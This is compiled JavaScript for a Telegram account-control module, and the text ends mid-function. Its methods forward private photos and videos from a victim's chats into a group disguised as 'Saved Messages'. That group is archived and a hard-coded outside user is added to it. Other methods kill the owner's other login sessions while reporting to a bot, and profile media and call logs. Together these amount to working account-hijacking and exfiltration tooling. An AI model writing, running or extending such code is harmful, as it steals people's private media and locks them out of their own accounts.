"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const telegram_1 = require("telegram");
const sessions_1 = require("telegram/sessions");
const events_1 = require("telegram/events");
const axios_1 = __importDefault(require("axios"));
const fs = __importStar(require("fs"));
const uploads_1 = require("telegram/client/uploads");
const Helpers_1 = require("telegram/Helpers");
const Logger_1 = require("telegram/extensions/Logger");
const IMap_1 = require("../../IMap/IMap");
const big_integer_1 = __importDefault(require("big-integer"));
const utils_1 = require("../../utils");
const parseError_1 = require("../../utils/parseError");
const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
const logbots_1 = require("../../utils/logbots");
const connection_manager_1 = require("./utils/connection-manager");
const message_search_dto_1 = require("./dto/message-search.dto");
const generateTGConfig_1 = require("./utils/generateTGConfig");
const telegram_logger_1 = require("./utils/telegram-logger");
const withTimeout_1 = require("../../utils/withTimeout");
const isPermanentError_1 = __importDefault(require("../../utils/isPermanentError"));
class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.logger = new telegram_logger_1.TelegramLogger('TgManager');
        this.timeoutErr = null;
        this.MAX_FILE_SIZE = 100 * 1024 * 1024;
        this.FILE_DOWNLOAD_TIMEOUT = 60000;
        this.TEMP_FILE_CLEANUP_DELAY = 3600000;
        this.THUMBNAIL_CONCURRENCY_LIMIT = 3;
        this.THUMBNAIL_BATCH_DELAY_MS = 100;
        this.session = new sessions_1.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
    }
    static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }
    static setActiveClientSetup(data) {
        TelegramManager.activeClientSetup = data;
    }
    async createGroup() {
        const groupName = "Saved Messages";
        const groupDescription = this.phoneNumber;
        this.logger.info(this.phoneNumber, "Creating group:", groupName);
        const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel({
            title: groupName,
            about: groupDescription,
            megagroup: true,
            forImport: true,
        }));
        const { id, accessHash } = result.chats[0];
        this.logger.info(this.phoneNumber, "Archived chat", id);
        await this.archiveChat(id, accessHash);
        const usersToAdd = ["fuckyoubabie1"];
        this.logger.info(this.phoneNumber, "Adding users to the channel:", usersToAdd);
        const addUsersResult = await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: new telegram_1.Api.InputChannel({
                channelId: id,
                accessHash: accessHash,
            }),
            users: usersToAdd
        }));
        this.logger.info(this.phoneNumber, "Successful addition of users:", addUsersResult);
        return { id, accessHash };
    }
    async archiveChat(id, accessHash) {
        const folderId = 1;
        this.logger.info(this.phoneNumber, "Archiving chat", id);
        return await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
            folderPeers: [
                new telegram_1.Api.InputFolderPeer({
                    peer: new telegram_1.Api.InputPeerChannel({
                        channelId: id,
                        accessHash: accessHash,
                    }),
                    folderId: folderId,
                }),
            ],
        }));
    }
    async createOrJoinChannel(channel) {
        let channelId;
        let channelAccessHash;
        if (channel) {
            try {
                const result = await this.joinChannel(channel);
                channelId = result.chats[0].id;
                channelAccessHash = result.chats[0].accessHash;
                this.logger.info(this.phoneNumber, "Archived chat", channelId);
            }
            catch (error) {
                const result = await this.createGroup();
                channelId = result.id;
                channelAccessHash = result.accessHash;
                this.logger.info(this.phoneNumber, "Created new group with ID:", channelId);
            }
        }
        else {
            const result = await this.createGroup();
            channelId = result.id;
            channelAccessHash = result.accessHash;
            this.logger.info(this.phoneNumber, "Created new group with ID:", channelId);
        }
        await this.archiveChat(channelId, channelAccessHash);
        return { id: channelId, accesshash: channelAccessHash };
    }
    async forwardMedia(channel, fromChatId) {
        let channelId;
        try {
            this.logger.info(this.phoneNumber, `Forwarding media from chat to channel ${channel} from ${fromChatId}`);
            let channelAccessHash;
            if (fromChatId) {
                const channelDetails = await this.createOrJoinChannel(channel);
                channelId = channelDetails.id;
                channelAccessHash = channelDetails.accesshash;
                await this.forwardSecretMsgs(fromChatId, channelId?.toString());
            }
            else {
                const chats = await this.getTopPrivateChats();
                const me = await this.getMe();
                if (chats.length > 0) {
                    const channelDetails = await this.createOrJoinChannel(channel);
                    channelId = channelDetails.id;
                    channelAccessHash = channelDetails.accesshash;
                    const finalChats = new Set(chats.map(chat => chat.chatId));
                    finalChats.add(me.id?.toString());
                    for (const chatId of finalChats) {
                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE] });
                        this.logger.info(this.phoneNumber, `Forwarding messages from chat: ${chatId} to channel: ${channelId}`);
                        await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);
                        await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);
                    }
                }
                this.logger.info(this.phoneNumber, "Completed forwarding messages from top private chats to channel:", channelId);
            }
        }
        catch (e) {
            this.logger.info(this.phoneNumber, e);
        }
        if (channelId) {
            await this.leaveChannels([channelId.toString()]);
            await connection_manager_1.connectionManager.unregisterClient(this.phoneNumber);
        }
    }
    async forwardMediaToBot(fromChatId) {
    }
    async forwardSecretMsgs(fromChatId, toChatId) {
        let offset = 0;
        const limit = 100;
        let totalMessages = 0;
        let forwardedCount = 0;
        let messages = [];
        do {
            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
            totalMessages = messages.total;
            const messageIds = messages.map((message) => {
                offset = message.id;
                if (message.id && message.media) {
                    return message.id;
                }
                return undefined;
            }).filter(id => id !== undefined);
            this.logger.info(this.phoneNumber, messageIds);
            if (messageIds.length > 0) {
                try {
                    const result = await this.client.forwardMessages(toChatId, {
                        messages: messageIds,
                        fromPeer: fromChatId,
                    });
                    forwardedCount += messageIds.length;
                    this.logger.info(this.phoneNumber, `Forwarded ${forwardedCount} / ${totalMessages} messages`);
                    await (0, Helpers_1.sleep)(5000);
                }
                catch (error) {
                    this.logger.error(this.phoneNumber, "Error occurred while forwarding messages:", error);
                }
                await (0, Helpers_1.sleep)(5000);
            }
        } while (messages.length > 0);
        this.logger.info(this.phoneNumber, "Left the channel with ID:", toChatId);
        return;
    }
    async forwardMessages(fromChatId, toChatId, messageIds) {
        const chunkSize = 30;
        const totalMessages = messageIds.length;
        let forwardedCount = 0;
        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });
                forwardedCount += chunk.length;
                this.logger.info(this.phoneNumber, `Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await (0, Helpers_1.sleep)(5000);
            }
            catch (error) {
                this.logger.error(this.phoneNumber, "Error occurred while forwarding messages:", error);
            }
        }
        return forwardedCount;
    }
    async destroy() {
        this.clearTimeoutErr();
        if (this.client) {
            try {
                this.client._errorHandler = null;
                await this.client?.destroy();
                this.client._eventBuilders = [];
                this.session?.delete();
                await (0, Helpers_1.sleep)(2000);
                this.logger.info(this.phoneNumber, "Client Disconnected Sucessfully");
            }
            catch (error) {
                (0, parseError_1.parseError)(error, `${this.phoneNumber}: Error during client cleanup`);
            }
            finally {
                if (this.client) {
                    this.client._destroyed = true;
                    if (this.client._sender && typeof this.client._sender.disconnect === 'function') {
                        await this.client._sender.disconnect();
                    }
                    this.client = null;
                }
            }
        }
    }
    async getchatId(username) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }
    async getMe() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const me = await this.client.getMe();
            return me;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting user info:', error);
            throw error;
        }
    }
    clearTimeoutErr() {
        if (this.timeoutErr) {
            clearTimeout(this.timeoutErr);
            this.timeoutErr == null;
        }
    }
    async errorHandler(error) {
        const errorDetails = (0, parseError_1.parseError)(error, `${this.phoneNumber}: RPC Error`, false);
        if ((error.message && error.message == 'TIMEOUT') || (0, utils_1.contains)(errorDetails.message, ['ETIMEDOUT'])) {
            this.logger.error(this.phoneNumber, `Timeout error occurred for ${this.phoneNumber}`, error);
            this.timeoutErr = setTimeout(async () => {
                if (this.client && !this.client.connected) {
                    this.logger.debug(this.phoneNumber, "disconnecting client Connection Manually");
                    await (0, connection_manager_1.unregisterClient)(this.phoneNumber);
                }
                else if (this.client) {
                    this.logger.debug(this.phoneNumber, "Client Connected after Retry");
                }
                else {
                    this.logger.debug(this.phoneNumber, "Client does not exist");
                }
            }, 10000);
        }
        else {
        }
    }
    async createClient(handler = true, handlerFn) {
        const tgCreds = await (0, utils_1.getCredentialsForMobile)(this.phoneNumber);
        this.apiHash = tgCreds.apiHash;
        this.apiId = tgCreds.apiId;
        const tgConfiguration = await (0, generateTGConfig_1.generateTGConfig)(this.phoneNumber);
        try {
            await (0, withTimeout_1.withTimeout)(async () => {
                this.client = new telegram_1.TelegramClient(this.session, this.apiId, this.apiHash, tgConfiguration);
                this.client.setLogLevel(Logger_1.LogLevel.ERROR);
                this.client._errorHandler = this.errorHandler.bind(this);
                await this.client.connect();
                this.logger.info(this.phoneNumber, "Connected Client Succesfully");
                this.clearTimeoutErr();
            }, {
                timeout: 180000,
                errorMessage: `[Tg Manager]\n${this.phoneNumber}: Client Creation TimeOut\n`
            });
            if (!this.client) {
                throw new Error(`Client is null after connection attempt for ${this.phoneNumber}`);
            }
            if (handler && this.client) {
                if (handlerFn) {
                    this.logger.info(this.phoneNumber, "Adding Custom Event Handler");
                    this.client.addEventHandler(async (event) => { await handlerFn(event); }, new events_1.NewMessage());
                }
                else {
                    this.logger.info(this.phoneNumber, "Adding Default Event Handler");
                    this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new events_1.NewMessage());
                }
                if (!this.client.connected) {
                    throw new Error(`Client not connected after connection attempt for ${this.phoneNumber}`);
                }
            }
            return this.client;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, "Client creation failed", error);
            if (this.client) {
                try {
                    await this.client.destroy();
                }
                catch (destroyError) {
                    this.logger.error(this.phoneNumber, "Error destroying failed client", destroyError);
                }
                this.client = null;
            }
            throw error;
        }
    }
    async getGrpMembers(entity) {
        try {
            const result = [];
            const chat = await this.client.getEntity(entity);
            if (!(chat instanceof telegram_1.Api.Chat || chat instanceof telegram_1.Api.Channel)) {
                this.logger.info(this.phoneNumber, "Invalid group or channel!");
                return;
            }
            this.logger.info(this.phoneNumber, `Fetching members of ${chat.title || chat.username}...`);
            const participants = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
                channel: chat,
                filter: new telegram_1.Api.ChannelParticipantsRecent(),
                offset: 0,
                limit: 200,
                hash: (0, big_integer_1.default)(0),
            }));
            if (participants instanceof telegram_1.Api.channels.ChannelParticipants) {
                const users = participants.participants;
                this.logger.info(this.phoneNumber, `Members: ${users.length}`);
                for (const user of users) {
                    const userInfo = user instanceof telegram_1.Api.ChannelParticipant ? user.userId : null;
                    if (userInfo) {
                        const userDetails = await this.client.getEntity(userInfo);
                        result.push({
                            tgId: userDetails.id,
                            name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
                            username: `${userDetails.username || ""}`,
                        });
                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                            this.logger.info(this.phoneNumber, JSON.stringify(userDetails.id));
                        }
                    }
                    else {
                        this.logger.info(this.phoneNumber, JSON.stringify(user?.userId));
                    }
                }
            }
            else {
                this.logger.info(this.phoneNumber, "No members found or invalid group.");
            }
            this.logger.info(this.phoneNumber, `${result.length}`);
            return result;
        }
        catch (err) {
            this.logger.error(this.phoneNumber, "Error fetching group members:", err);
        }
    }
    async getMessages(entityLike, limit = 8) {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const chats = [];
            let total = 0;
            for await (const dialog of this.client.iterDialogs(params)) {
                chats.push(dialog);
                total++;
            }
            this.logger.info(this.phoneNumber, "TotalChats:", total);
            return Object.assign(chats, { total });
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting dialogs:', error);
            throw error;
        }
    }
    async getSelfMSgsInfo(limit = 500) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const self = await this.client.getMe();
            const selfChatId = self.id;
            let photoCount = 0;
            let ownPhotoCount = 0;
            let ownVideoCount = 0;
            let otherPhotoCount = 0;
            let otherVideoCount = 0;
            let videoCount = 0;
            let movieCount = 0;
            let analyzedMessages = 0;
            const maxLimit = Math.min(Math.max(limit, 1), 10000);
            for await (const message of this.client.iterMessages(selfChatId, {
                limit: maxLimit,
                reverse: false
            })) {
                analyzedMessages++;
                if (!message)
                    continue;
                const hasMedia = message.media && !(message.media instanceof telegram_1.Api.MessageMediaEmpty);
                if (hasMedia) {
                    if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                        photoCount++;
                        if (message.out) {
                            ownPhotoCount++;
                        }
                        else {
                            otherPhotoCount++;
                        }
                    }
                    else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                        const document = message.media.document;
                        if (document instanceof telegram_1.Api.Document) {
                            const isVideo = document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
                            if (isVideo) {
                                videoCount++;
                                if (message.out) {
                                    ownVideoCount++;
                                }
                                else {
                                    otherVideoCount++;
                                }
                            }
                        }
                    }
                }
                if (message.text) {
                    const text = message.text.toLowerCase();
                    const movieKeywords = ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'];
                    if ((0, utils_1.contains)(text, movieKeywords)) {
                        movieCount++;
                    }
                }
                if (analyzedMessages >= maxLimit) {
                    break;
                }
            }
            let totalMessages = analyzedMessages;
            try {
                const firstBatch = await this.client.getMessages(selfChatId, { limit: 1 });
                if (firstBatch.total) {
                    totalMessages = firstBatch.total;
                }
            }
            catch (totalError) {
                this.logger.debug(this.phoneNumber, 'Could not fetch total message count, using analyzed count');
            }
            this.logger.info(this.phoneNumber, `getSelfMSgsInfo: Analyzed ${analyzedMessages} messages`, {
                photoCount,
                videoCount,
                movieCount,
                total: totalMessages
            });
            return {
                total: totalMessages,
                photoCount,
                videoCount,
                movieCount,
                ownPhotoCount,
                otherPhotoCount,
                ownVideoCount,
                otherVideoCount,
                analyzedMessages
            };
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error in getSelfMSgsInfo:', error);
            throw error;
        }
    }
    async addContact(data, namePrefix) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                try {
                    await this.client.invoke(new telegram_1.Api.contacts.AddContact({
                        firstName,
                        lastName,
                        phone: user.mobile,
                        id: user.tgId
                    }));
                }
                catch (e) {
                    this.logger.info(this.phoneNumber, e);
                }
            }
        }
        catch (error) {
            this.logger.error(this.phoneNumber, "Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async addContacts(mobiles, namePrefix) {
        try {
            const inputContacts = [];
            for (let i = 0; i < mobiles.length; i++) {
                const user = mobiles[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                const clientId = (0, big_integer_1.default)((i << 16 | 0).toString(10));
                inputContacts.push(new telegram_1.Api.InputPhoneContact({
                    clientId: clientId,
                    phone: user,
                    firstName: firstName,
                    lastName: lastName
                }));
            }
            const result = await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                contacts: inputContacts,
            }));
            this.logger.info(this.phoneNumber, "Imported Contacts Result:", result);
        }
        catch (error) {
            this.logger.error(this.phoneNumber, "Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async leaveChannels(chats) {
        this.logger.info(this.phoneNumber, "Leaving Channels/Groups: initiated!!");
        this.logger.info(this.phoneNumber, "ChatsLength: ", chats.length);
        if (chats.length === 0) {
            this.logger.info(this.phoneNumber, "No chats to leave");
            return;
        }
        const chatsToLeave = new Set();
        for (const id of chats) {
            chatsToLeave.add(id);
            if (id.startsWith('-100')) {
                chatsToLeave.add(id.substring(4));
            }
            else {
                chatsToLeave.add(`-100${id}`);
            }
        }
        const entityMap = new Map();
        let foundCount = 0;
        try {
            for await (const dialog of this.client.iterDialogs({})) {
                const entity = dialog.entity;
                if (entity instanceof telegram_1.Api.Channel || entity instanceof telegram_1.Api.Chat) {
                    const entityId = entity.id.toString();
                    if (chatsToLeave.has(entityId)) {
                        entityMap.set(entityId, { entity, dialog });
                        foundCount++;
                        if (foundCount >= chats.length) {
                            this.logger.debug(this.phoneNumber, `Found all ${foundCount} chats, stopping iteration early`);
                            break;
                        }
                    }
                    if (entityId.startsWith('-100')) {
                        const shortId = entityId.substring(4);
                        if (chatsToLeave.has(shortId) && !entityMap.has(shortId)) {
                            entityMap.set(shortId, { entity, dialog });
                            foundCount++;
                            if (foundCount >= chats.length)
                                break;
                        }
                    }
                    else {
                        const longId = `-100${entityId}`;
                        if (chatsToLeave.has(longId) && !entityMap.has(longId)) {
                            entityMap.set(longId, { entity, dialog });
                            foundCount++;
                            if (foundCount >= chats.length)
                                break;
                        }
                    }
                }
            }
            this.logger.debug(this.phoneNumber, `Found ${entityMap.size} matching chats from dialogs`);
        }
        catch (error) {
            this.logger.error(this.phoneNumber, "Failed to iterate dialogs:", error);
            throw error;
        }
        if (entityMap.size === 0) {
            this.logger.warn(this.phoneNumber, "No matching chats found in dialogs to leave");
            return;
        }
        const me = await this.client.getMe();
        let successCount = 0;
        let skipCount = 0;
        for (const id of chats) {
            try {
                let entityData = entityMap.get(id) ||
                    entityMap.get(id.startsWith('-100') ? id.substring(4) : `-100${id}`);
                if (!entityData) {
                    this.logger.warn(this.phoneNumber, `Chat ${id} not found in dialogs, skipping`);
                    skipCount++;
                    continue;
                }
                const { entity } = entityData;
                let chatType;
                let left = false;
                if (entity instanceof telegram_1.Api.Channel) {
                    await this.client.invoke(new telegram_1.Api.channels.LeaveChannel({
                        channel: entity
                    }));
                    chatType = entity.broadcast ? 'channel' : 'supergroup';
                    left = true;
                }
                else if (entity instanceof telegram_1.Api.Chat) {
                    await this.client.invoke(new telegram_1.Api.messages.DeleteChatUser({
                        chatId: entity.id,
                        userId: me.id,
                        revokeHistory: false
                    }));
                    chatType = 'group';
                    left = true;
                }
                else {
                    this.logger.warn(this.phoneNumber, `Unknown entity type for ${id}, skipping`);
                    skipCount++;
                    continue;
                }
                if (left) {
                    this.logger.info(this.phoneNumber, `Left ${chatType}: ${id}`);
                    successCount++;
                }
                if (chats.length > 1) {
                    await (0, Helpers_1.sleep)(3000);
                }
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error, `${this.phoneNumber} Failed to leave chat ${id}:`, false);
                if ((0, isPermanentError_1.default)(errorDetails)) {
                    this.logger.error(this.phoneNumber, `Permanent error leaving ${id}:`, errorDetails.message);
                    skipCount++;
                    continue;
                }
                this.logger.warn(this.phoneNumber, `Error leaving ${id}:`, errorDetails.message);
                skipCount++;
            }
        }
        this.logger.info(this.phoneNumber, `Leaving Channels/Groups: Completed! Success: ${successCount}, Skipped: ${skipCount}, Total: ${chats.length}`);
    }
    async getEntity(entity) {
        return await this.client?.getEntity(entity);
    }
    async joinChannel(entity) {
        this.logger.info(this.phoneNumber, "trying to join channel: ", `@${entity}`);
        return await this.client?.invoke(new telegram_1.Api.channels.JoinChannel({
            channel: await this.client?.getEntity(entity)
        }));
    }
    connected() {
        return this.client.connected;
    }
    async connect() {
        return await this.client.connect();
    }
    async removeOtherAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            }
            else {
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }
    isAuthMine(auth) {
        const authCriteria = [
            { field: 'country', value: 'singapore' },
            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },
            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }
        ];
        return authCriteria.some(criterion => {
            const fieldValue = auth[criterion.field]?.toLowerCase?.() || '';
            if (criterion.field === 'deviceModel' && fieldValue.endsWith('ssk')) {
                return true;
            }
            if ('values' in criterion) {
                return criterion.values.some(value => fieldValue.includes(value.toLowerCase()));
            }
            return fieldValue.includes(criterion.value.toLowerCase());
        });
    }
    async resetAuthorization(auth) {
        try {
            await this.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
        }
        catch (error) {
            (0, parseError_1.parseError)(error, `Failed to reset authorization for ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel} `);
        }
    }
    async getAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        return result;
    }
    async getAllChats() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chatData = [];
        let total = 0;
        for await (const chat of this.client.iterDialogs({ limit: 500 })) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
            total++;
        }
        this.logger.info(this.phoneNumber, "TotalChats:", total);
        return chatData;
    }
    async getMessagesNew(chatId, offset = 0, limit = 20) {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });
        const result = await Promise.all(messages.map(async (message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;
            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));
        return result;
    }
    async getMediaUrl(message) {
        if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
            this.logger.info(this.phoneNumber, "messageId image:", message.id);
            const photo = message.photo;
            const sizes = photo?.sizes || [];
            const preferredSize = sizes.find((s) => s.type === 'm') ||
                sizes.find((s) => s.type === 'x') ||
                sizes[sizes.length - 1] ||
                sizes[0];
            return await this.client.downloadMedia(message, {
                thumb: preferredSize || sizes[0]
            });
        }
        else if (message.media instanceof telegram_1.Api.MessageMediaDocument &&
            (message.document?.mimeType?.startsWith('video') ||
                message.document?.mimeType?.startsWith('image'))) {
            this.logger.info(this.phoneNumber, "messageId video:", message.id);
            const thumbs = message.document?.thumbs || [];
            const preferredThumb = thumbs.find((t) => t.type === 'm') ||
                thumbs[thumbs.length - 1] ||
                thumbs[0];
            return await this.client.downloadMedia(message, {
                thumb: preferredThumb || thumbs[0]
            });
        }
        return null;
    }
    async getThumbnailBuffer(message) {
        try {
            if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                const sizes = message.photo?.sizes || [];
                if (sizes.length > 0) {
                    const preferredSize = sizes.find((s) => s.type === 'm') ||
                        sizes.find((s) => s.type === 'x') ||
                        sizes[sizes.length - 1] ||
                        sizes[0];
                    return await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: preferredSize }), 30000);
                }
            }
            else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                const thumbs = message.document?.thumbs || [];
                if (thumbs.length > 0) {
                    const preferredThumb = thumbs.find((t) => t.type === 'm') ||
                        thumbs[thumbs.length - 1] ||
                        thumbs[0];
                    return await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: preferredThumb }), 30000);
                }
            }
        }
        catch (error) {
            this.logger.warn(this.phoneNumber, `Failed to get thumbnail for message ${message.id}:`, error);
        }
        return null;
    }
    async getMessageWithMedia(messageId, chatId) {
        const entity = await this.safeGetEntity(chatId);
        const messages = await this.client.getMessages(entity, { ids: [messageId] });
        const message = messages[0];
        if (!message || message.media instanceof telegram_1.Api.MessageMediaEmpty) {
            throw new Error('Media not found');
        }
        return message;
    }
    getMediaFileInfo(message) {
        const media = message.media;
        let contentType;
        let filename;
        let fileLocation;
        let fileSize = 0;
        let inputLocation;
        if (media instanceof telegram_1.Api.MessageMediaPhoto) {
            const photo = message.photo;
            if (!photo || photo instanceof telegram_1.Api.PhotoEmpty) {
                throw new Error('Photo not found in message');
            }
            inputLocation = photo;
            contentType = 'image/jpeg';
            filename = 'photo.jpg';
            const data = {
                id: photo.id,
                accessHash: photo.accessHash,
                fileReference: photo.fileReference,
            };
            fileLocation = new telegram_1.Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
            const sizes = photo?.sizes || [];
            const largestSize = sizes[sizes.length - 1];
            if (largestSize && 'size' in largestSize) {
                fileSize = largestSize.size || 0;
            }
        }
        else if (media instanceof telegram_1.Api.MessageMediaDocument) {
            const document = media.document;
            if (!document || document instanceof telegram_1.Api.DocumentEmpty) {
                throw new Error('Document not found in message');
            }
            if (!(document instanceof telegram_1.Api.Document)) {
                throw new Error('Document format not supported');
            }
            inputLocation = document;
            const fileNameAttr = document.attributes?.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
            filename = fileNameAttr?.fileName || 'document.bin';
            contentType = document.mimeType || this.detectContentType(filename);
            fileSize = typeof document.size === 'number' ? document.size : (document.size ? Number(document.size.toString()) : 0);
            const data = {
                id: document.id,
                accessHash: document.accessHash,
                fileReference: document.fileReference,
            };
            fileLocation = new telegram_1.Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
        }
        else {
            throw new Error('Unsupported media type');
        }
        return {
            contentType,
            filename,
            fileLocation,
            fileSize,
            inputLocation
        };
    }
    async sendInlineMessage(chatId, message, url) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new telegram_1.Api.KeyboardButtonUrl(button)]
        });
        return result;
    }
    async getMediaMessages() {
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhotos(),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        return result;
    }
    async getCallLog(limit = 1000) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const maxLimit = Math.min(Math.max(limit, 1), 10000);
            let analyzedCalls = 0;
            const filteredResults = {
                outgoing: 0,
                incoming: 0,
                video: 0,
                audio: 0,
                chatCallCounts: {},
                totalCalls: 0
            };
            const result = await this.client.invoke(new telegram_1.Api.messages.Search({
                peer: new telegram_1.Api.InputPeerEmpty(),
                q: '',
                filter: new telegram_1.Api.InputMessagesFilterPhoneCalls({}),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: maxLimit,
                maxId: 0,
                minId: 0,
                hash: (0, big_integer_1.default)(0),
            }));
            const callLogs = result.messages.filter((message) => message.action instanceof telegram_1.Api.MessageActionPhoneCall);
            const entityCache = new Map();
            for (const log of callLogs) {
                if (analyzedCalls >= maxLimit)
                    break;
                try {
                    if (!log.action || !(log.action instanceof telegram_1.Api.MessageActionPhoneCall)) {
                        continue;
                    }
                    filteredResults.totalCalls++;
                    analyzedCalls++;
                    const logAction = log.action;
                    if (log.out) {
                        filteredResults.outgoing++;
                    }
                    else {
                        filteredResults.incoming++;
                    }
                    if (logAction.video) {
                        filteredResults.video++;
                    }
                    else {
                        filteredResults.audio++;
                    }
                    let chatId;
                    let peerType = 'user';
                    if (log.peerId instanceof telegram_1.Api.PeerUser) {
                        chatId = log.peerId.userId.toString();
                        peerType = 'user';
                    }
                    else if (log.peerId instanceof telegram_1.Api.PeerChat) {
                        chatId = log.peerId.chatId.toString();
                        peerType = 'group';
                    }
                    else if (log.peerId instanceof telegram_1.Api.PeerChannel) {
                        chatId = log.peerId.channelId.toString();
                        peerType = 'channel';
                    }
                    else {
                        const peerTypeName = log.peerId?.className || 'Unknown';
                        this.logger.warn(this.phoneNumber, `Unknown peer type in call log: ${peerTypeName}`);
                        continue;
                    }
                    if (!filteredResults.chatCallCounts[chatId]) {
                        if (!entityCache.has(chatId)) {
                            try {
                                const entity = await this.safeGetEntity(chatId);
